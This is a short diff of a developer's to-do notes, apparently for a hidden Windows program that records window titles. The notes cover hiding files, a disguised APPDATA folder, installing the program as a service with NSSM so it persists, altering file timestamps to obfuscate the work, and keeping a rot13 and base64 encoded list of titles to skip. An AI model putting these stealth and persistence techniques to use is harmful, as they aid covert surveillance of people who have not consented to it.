@@ -1,9 +1,14 @@
-set file attributes as hidden
+you can modify file attributes programatically, e.g. file creation time etc. to further obfuscate your work
+    check if you can do so on an open file
 
-(getenv('APPDATA') + "\\WinEvent\\"
-create that folder first
+you could load which window titles you want to skip from a file, which is encrypted with something like rot13 and base64
 
 
-    Step 1: Download NSSM
-    Step 2: Install your sevice with nssm.exe install [serviceName]
-    Step 3: This will open a GUI which you will use to locate your executable
+
+Make sure it only executes once
+
+    read the file, from globalVariables.path
+        if unable, or there in no such file then set unwantedWindowTitles as an empty set
+    transform it with base64
+        transform that with rot13
+            now put that into unwantedWindowTitles var, as a set
